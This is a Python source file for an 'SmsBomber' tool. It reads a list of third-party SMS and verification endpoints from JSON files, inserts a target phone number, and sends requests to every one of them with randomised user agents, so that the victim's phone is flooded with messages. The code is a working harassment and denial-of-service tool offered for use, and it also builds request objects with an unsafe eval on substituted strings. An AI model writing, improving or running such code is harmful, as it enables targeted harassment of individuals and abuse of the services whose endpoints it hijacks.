import json
import time
import requests
import random
import os, sys

Green = '\033[92m'
Blue = '\033[94m'
Grey = '\033[0m'
Red = '\033[31m'
White = '\33[97m'
Yellow = '\33[93m'

class SmsBomber:
    def __init__(self, phone) -> None:
        self.phone = phone

    def handle(self):
        a = []
        with open('JSON/agent.json', 'r') as f:
            agent = json.load(f)['header']
            with open('JSON/api.json', 'r') as j:
                API = json.load(j)['api']
                for i in API:
                    try:
                        if i.get('header') == '':
                            i['header'] = random.choice(agent)
                            # i['header'] = {'User-Agent': 'Mozilla/6.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0'}
                        api = str(i).replace("[phone]", self.phone).replace("[timestamp]", str(int(time.time() * 1000))).replace("'", '"')
                        api = eval(api)
                        a.append(api)
                    except:
                        pass
        a = json.dumps(a)
        return json.loads(a)
    
    def send(self):
        API = self.handle()
        for api in API:
            try:
                method = api.get('method')
                if method == 'GET':
                    r = requests.get(url=api.get('url'), headers=api.get('header'), timeout=3)
                else:
                    r = requests.post(url=api.get('url'), headers=api.get('header'), data=api.get('data'), timeout=3)
                print(Green + api.get('desc') + ' ' + api.get('method') +' send success!' + Grey)
            except KeyboardInterrupt:
                sys.stdout.write(Red + '[!] Keyboard Interrupt !' + Grey)
                time.sleep(1)
                return
            except:
                print(Red + api.get('desc') + ' ' + api.get('method') +' send error!' + Grey)

        time.sleep(1)


